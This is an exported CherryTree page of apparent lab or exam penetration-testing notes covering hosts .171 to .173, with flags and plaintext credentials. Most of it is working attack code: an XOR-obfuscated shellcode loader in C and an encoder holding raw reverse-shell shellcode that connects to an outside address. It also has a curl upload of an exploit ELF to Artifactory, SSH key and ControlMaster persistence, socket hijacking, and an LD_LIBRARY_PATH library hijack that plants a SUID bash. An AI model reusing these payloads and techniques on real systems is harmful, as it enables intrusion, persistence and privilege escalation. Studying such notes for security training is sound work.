<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>03</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>03</h1><br/><p><h2>Foothold</h2> (.171)<ul><li>gcc -static</li><li>upx --best &lt;elf&gt;</li><li></li></ul><div class="codebox"><pre><span style="color:#7f0044;font-weight:700">#define _GNU_SOURCE</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;sys/mman.h&gt;</span> <span style="color:#0088ff;font-weight:400">// for mprotect #include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;dlfcn.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[]=<span style="color:#3ad900;font-weight:400">&quot;\x7B\xB5\x20\x43\x12\xD3\xFC\x5A\x02\xC3\x9C\x07\x7B\x83\x20\x68\x0B\x10\x20\x4D\x10\x45\x4F\x02\xCF\x8A\x32\x1B\x20\x40\x0B\x13\x1A\x20\x63\x12\xD3\x20\x48\x15\x20\x4B\x14\x45\x4F\x02\xCF\x8A\x32\x71\x02\xDD\x02\xF3\x48\x4A\x4B\xF1\x8A\xE2\x67\xD6\x1B\x02\xC3\xAC\x20\x5A\x10\x20\x60\x12\x45\x4F\x13\x02\xCF\x8A\x33\x6F\x03\xB5\x83\x3E\x52\x1D\x20\x69\x12\x20\x4A\x20\x4F\x02\xC3\xAD\x02\x7B\xBC\x45\x4F\x13\x13\x15\x02\xCF\x8A\x33\x8D\x20\x76\x12\x20\x4B\x15\x45\x4F\x14\x20\x34\x10\x45\x4F\x02\xCF\x8A\x32\xA7\xB5\xAC\x4A&quot;</span>;<br /><br /><span style="color:#7f0044;font-weight:400">int</span> main()<br />{<br />	<span style="color:#7f0044;font-weight:400">char</span> xor_key = <span style="color:#00117f;font-weight:400">&#39;J&#39;</span>;<br />	<span style="color:#7f0044;font-weight:400">int</span> arraysize = (<span style="color:#7f0044;font-weight:400">int</span>) <span style="color:#ff9d00;font-weight:400">sizeof</span>(buf);<br />	<span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i=<span style="color:#ff0044;font-weight:400">0</span>; i&lt;arraysize-<span style="color:#ff0044;font-weight:400">1</span>; i++)<br />	{<br />		buf[i] = buf[i]^xor_key;<br />	}<br />	printf(<span style="color:#3ad900;font-weight:400">&quot;I love programming.&quot;</span>);<br />	<span style="color:#0088ff;font-weight:400">//sleep(10);</span><br />	<span style="color:#ff9d00;font-weight:700">if</span> (fork() == <span style="color:#ff0044;font-weight:400">0</span>)<br />	{<br />		<span style="color:#7f0044;font-weight:400">intptr_t</span> pagesize = sysconf(_SC_PAGESIZE);<br />		<span style="color:#ff9d00;font-weight:700">if</span> (mprotect((<span style="color:#7f0044;font-weight:400">void</span> *)(((<span style="color:#7f0044;font-weight:400">intptr_t</span>)buf) &amp; ~(pagesize - <span style="color:#ff0044;font-weight:400">1</span>)),<br />		pagesize, PROT_READ|PROT_EXEC)) {<br />			perror(<span style="color:#3ad900;font-weight:400">&quot;mprotect&quot;</span>);<br />			<span style="color:#ff9d00;font-weight:700">return</span> -<span style="color:#ff0044;font-weight:400">1</span>;<br />		}<br />		<span style="color:#7f0044;font-weight:400">int</span> (*ret)() = (<span style="color:#7f0044;font-weight:400">int</span>(*)())buf;ret();<br />	}<br /><br />	<span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">3</span>;<br />}</pre></div><ul><li></li></ul><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">// XOR encoder</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdio.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;stdlib.h&gt;</span><br /><span style="color:#7f0044;font-weight:700">#include &lt;unistd.h&gt;</span><br /><span style="color:#7f0044;font-weight:400">unsigned</span> <span style="color:#7f0044;font-weight:400">char</span> buf[] =<br /><span style="color:#3ad900;font-weight:400">&quot;\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x22\x41\x5a\x6a\x07\x5a\x0f\x05\x48\x85\xc0\x78\x51&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x0a\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x5e\x0f\x05\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x01\xbb\xc0\xa8\x2d\x9c\x51\x48\x89\xe6\x6a\x10\x5a\x6a&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x2a\x58\x0f\x05\x59\x48\x85\xc0\x79\x25\x49\xff\xc9\x74&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x18\x57\x6a\x23\x58\x6a\x00\x6a\x05\x48\x89\xe7\x48\x31&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\xf6\x0f\x05\x59\x59\x5f\x48\x85\xc0\x79\xc7\x6a\x3c\x58&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e\x5a\x0f\x05\x48\x85\xc0&quot;</span><br /><span style="color:#3ad900;font-weight:400">&quot;\x78\xed\xff\xe6&quot;</span>;<br /><br /><span style="color:#7f0044;font-weight:400">int</span> main (<span style="color:#7f0044;font-weight:400">int</span> argc, <span style="color:#7f0044;font-weight:400">char</span> **argv)<br />{<br />    <span style="color:#7f0044;font-weight:400">char</span> xor_key = <span style="color:#00117f;font-weight:400">&#39;J&#39;</span>;<br />    <span style="color:#7f0044;font-weight:400">int</span> payload_length = (<span style="color:#7f0044;font-weight:400">int</span>) <span style="color:#ff9d00;font-weight:400">sizeof</span>(buf);<br />    <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i=<span style="color:#ff0044;font-weight:400">0</span>; i&lt;payload_length; i++)<br />    {<br />        printf(<span style="color:#3ad900;font-weight:400">&quot;\\x%02X&quot;</span>,buf[i]^xor_key);<br />    }<br /><span style="color:#ff9d00;font-weight:700">return</span> <span style="color:#ff0044;font-weight:400">0</span>;<br />}</pre></div></p><p></p><p>Flag 1: 4329a99d89cd8839818425a837c2e6e5</p><p></p><p><h2>lateral (.172)</h2><ul><li>jfrog creds<ul><li>walleyedev : photofinish</li><li>from repo.txt</li></ul></li></ul></p><p><ul><li>jfrog =&gt; artifactory =&gt; set me up<ul><li>curl -uwalleyedev:photofinish -T ./exploit.elf &quot;http://192.168.179.173:8081/artifactory/generic-local/tpsreports.elf&quot;</li><li>fix checksum</li></ul></li></ul></p><p><ul><li><strong>local.txt</strong>: dfb45a73c8507d6272ae554300c8c795</li></ul></p><p></p><p></p><p></p><p>potential loots</p><p>todd : whyaretheresomanyants</p><p></p><p></p><p><em><strong>Persistence</strong></em><ul><li>cat id_rsa.pub &gt;&gt;authorized_keys </li><li>in controlmaster config </li><li>Host *</li></ul></p><p>	ControlPath ~/.ssh/controlmaster/%r@%h:%p</p><p>        ControlMaster auto</p><p>        ControlPersist yes</p><p></p><p></p><p><strong>Exploit cron</strong><ul><li>So it seems to be a cron running every 5th minute. So if I do ls -la at every 5th minute, I see the</li></ul></p><p>socket comes up:</p><p><img src="images/357-1.png" alt="images/357-1.png" /></p><p></p><p></p><p></p><p><em><strong>Exploit</strong></em></p><p> ssh -S marks@cb3:22 marks@cb3</p><p> </p><p> flag (.173): <strong>88b6e66995f970de8794fa3c41688c70</strong></p><p> </p><p> </p><p> </p><p><h2>ANsible exploit</h2></p><p> </p><p> bowwow</p><p> </p><p> <img src="images/357-2.png" alt="images/357-2.png" /></p><p> </p><p> * root : lifeintheantfarm (.171)</p><p> flag 4: <strong>3fd8b9cd01b11f5b600ef31171157a0a</strong> (171)</p><p> </p><p> </p><p> </p><p><h2>Privesc cb3</h2></p><p> </p><p> <strong>pspy</strong></p><p> * bin/sh -c sudo -u marks bash -i -c &#39;source /home/marks/.bashrc; echo &quot;nothingwaschangedargh&quot; | sudo -S netstat -ap &gt; /tmp/mark_listening.txt&#39; </p><p> </p><p> </p><p><h2>Shared Library Hijacking via LD_LIBRARY_PATH</h2></p><p> </p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## find libraries</span><br />ldd /bin/netstat<br /><br /><span style="color:#0088ff;font-weight:400">## chose a writable path </span><br /><span style="color:#333333;font-weight:400">```c<br />### code below of dll<br />```</span>c<br /><br /><span style="color:#0088ff;font-weight:400"># compile </span><br /><span style="color:#ff9d00;font-weight:700">gcc</span> -Wall -fPIC -c -o hax.o hax.c<br /><span style="color:#ff9d00;font-weight:700">gcc</span> -shared -o libhax.so hax.o<br /><span style="color:#0088ff;font-weight:400"># upload library to user home folder </span><br /><span style="color:#0088ff;font-weight:400">## modify .bashrc because env variable are not persistentr so you must specify library path </span><br /><span style="color:#ff9d00;font-weight:700">alias</span> sudo=<span style="color:#3ad900;font-weight:400">&quot;sudo LD_LIBRARY_PATH=/home/marks&quot;</span><br /><span style="color:#0088ff;font-weight:400">## wait for the cron job to trigger</span></pre></div></p><p>Library c code </p><p><div class="codebox"><pre><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdio.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;stdlib.h&gt;</span><br /><span style="color:#0088ff;font-weight:400">#include &lt;unistd.h&gt; // for setuid/setgid</span><br />static void runmahpayload<span style="color:#ff9d00;font-weight:700">()</span> __attribute__<span style="color:#ff9d00;font-weight:700">((</span>constructor<span style="color:#ff9d00;font-weight:700">));</span> <span style="color:#ff9d00;font-weight:700">//</span> telling compiler that this function willbe defined latervoid runmahpayload<span style="color:#ff9d00;font-weight:700">()</span> <span style="color:#ff9d00;font-weight:700">{</span><br />void runmahpayload<span style="color:#ff9d00;font-weight:700">(){</span><br />setuid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br />setgid<span style="color:#ff9d00;font-weight:700">(</span>0<span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">printf(</span><span style="color:#3ad900;font-weight:400">&quot;DLL HIJACKING IN PROGRESS \n&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br />system<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&quot;</span><span style="color:#ff9d00;font-weight:700">);</span><br /><span style="color:#ff9d00;font-weight:700">}</span></pre></div></p></div>
</body>
</html>
